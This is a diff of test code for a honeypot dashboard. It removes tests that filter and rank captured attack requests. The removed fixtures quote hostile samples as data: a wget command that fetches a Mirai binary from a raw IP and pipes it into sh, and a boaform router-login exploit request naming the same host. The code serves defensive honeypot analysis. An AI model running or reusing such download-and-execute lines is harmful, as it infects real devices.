@@ -142,30 +142,6 @@ class _FakeAggregateStore:
             'GET /normal HTTP/1.1',
         ]
 
-    def fetch_interesting_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
-        self.since_seen = since
-        self.sinces_seen.append(since)
-        return [
-            {
-                'raw': 'wget http://91.92.40.118/mirai -O - | sh',
-                'classification': 'unknown',
-                'detected_id': None,
-                'request_path': '/',
-                'request_command': 'GET',
-                'login': '',
-            }
-            for _ in range(52)
-        ] + [
-            {
-                'raw': 'GET /normal HTTP/1.1',
-                'classification': 'unknown',
-                'detected_id': None,
-                'request_path': '/normal',
-                'request_command': 'GET',
-                'login': '',
-            },
-        ]
-
     def volume_series(self, since=None, bucket='hour', port=None):  # noqa: ANN001, ANN002
         return []
 
@@ -308,113 +284,6 @@ def test_extract_c2_hosts_runs_inside_payload_window(monkeypatch, window):
 
 
 # ---------------------------------------------------------------------------
-# Payloads panel: only juicy findings (issue #362)
-# ---------------------------------------------------------------------------
-
-
-def _row(raw, **kw):
-    base = {
-        'raw': raw,
-        'classification': 'unknown',
-        'detected_id': None,
-        'request_path': kw.get('request_path', '/'),
-        'request_command': kw.get('request_command', 'GET'),
-        'login': kw.get('login', ''),
-    }
-    base['classification'] = kw.get('classification', 'unknown')
-    base['detected_id'] = kw.get('detected_id')
-    return base
-
-
-def test_build_payloads_drops_benign_and_favicon_and_ranks_crit_above_info():
-    rows = [
-        # Benign scanner -> excluded entirely.
-        _row('GET /admin HTTP/1.1', classification='benign'),
-        # Favicon noise -> excluded.
-        _row('GET /favicon.ico HTTP/1.1', request_path='/favicon.ico'),
-        # Bare HEAD probe with no payload -> excluded.
-        _row('HEAD / HTTP/1.1', request_command='HEAD'),
-        # Info-level: a plain URL-bearing GET.
-        _row('GET /x?u=http://203.0.113.9/p HTTP/1.1', detected_id=None),
-        # Crit-level: credential captured (login non-empty).
-        _row('POST /login HTTP/1.1', request_command='POST', login='admin:hunter2'),
-    ]
-    out = _dash_mod._build_payloads(rows)
-    assert len(out) == 2
-    # crit (login captured) must rank ABOVE info.
-    assert 'admin:hunter2' in out[0]
-    assert '203.0.113.9' in out[1]
-    # benign + favicon + bare HEAD all gone.
-    joined = '\n'.join(out)
-    assert 'favicon.ico' not in joined
-    assert len([r for r in rows if r['classification'] == 'benign']) == 1
-
-
-def test_build_payloads_respects_limit():
-    rows = [
-        _row(f'GET /x{i}?u=http://203.0.113.{i}/p HTTP/1.1') for i in range(100)
-    ]
-    out = _dash_mod._build_payloads(rows)
-    # All info-level and tied on severity -> recency-ish tie via raw text; limit caps at _PAYLOADS_LIMIT.
-    assert len(out) == _dash_mod._PAYLOADS_LIMIT
-
-
-def test_fetch_interesting_raws_shape_and_benign_filter(tmp_path, monkeypatch):
-    """The storage layer returns row dicts and drops benign rows (issue #362)."""
-    from manyfaced.db import storage as storage_mod
-    from manyfaced.db.storage import SQLiteStorage
-
-    db_path = str(tmp_path / 'juicy.db')
-    monkeypatch.setenv('HONEY_DB_PATH', db_path)
-    storage_mod.reset_storage_singleton()
-    storage = SQLiteStorage(db_path=db_path)
-    storage.insert(
-        {
-            'ip': '1.1.1.1',
-            'hostname': 'h',
-            'timestamp': '2026-01-01 00:00:00.000000',
-            'parsed_request': {},
-            'raw_request': 'GET /favicon.ico HTTP/1.1',
-            'is_detected': None,
-            'listen_port': 80,
-            'classification': 'unknown',
-        }
-    )
-    storage.insert(
-        {
-            'ip': '2.2.2.2',
-            'hostname': 'h',
-            'timestamp': '2026-01-02 00:00:00.000000',
-            'parsed_request': {},
-            'raw_request': 'GET /x?u=http://203.0.113.9/p HTTP/1.1',
-            'is_detected': None,
-            'listen_port': 80,
-            'classification': 'benign',
-        }
-    )
-    storage.insert(
-        {
-            'ip': '3.3.3.3',
-            'hostname': 'h',
-            'timestamp': '2026-01-03 00:00:00.000000',
-            'parsed_request': {},
-            'raw_request': 'POST /boaform/admin/formLogin?x=http://91.92.40.118/m HTTP/1.1',
-            'is_detected': None,
-            'listen_port': 80,
-            'classification': 'unknown',
-        }
-    )
-    rows = storage.fetch_interesting_raws(since=None, limit=100)
-    # favicon (no ://) and benign both excluded -> exactly the URL-bearing unknown row.
-    assert len(rows) == 1
-    r = rows[0]
-    assert r['raw'].startswith('POST /boaform')
-    assert r['classification'] == 'unknown'
-    assert 'detected_id' in r and 'request_path' in r and 'login' in r
-    storage.close()
-    storage_mod.reset_storage_singleton()
-
-
 # ---------------------------------------------------------------------------
 # Click interactivity (issue #361): rows must carry the data-* attributes the
 # wireIocRows() handler reads, and the handler must be present in the page JS.
@@ -463,6 +332,7 @@ def test_ioc_rows_emit_click_data_attributes():
 
 def test_dashboard_js_wires_ioc_rows():
     from manyfaced.web.dashboard_assets import JS as _JS
+
     assert 'function wireIocRows' in _JS
     # Invoked from both applyFragment and the DOM-ready init block.
     assert _JS.count('wireIocRows()') >= 2
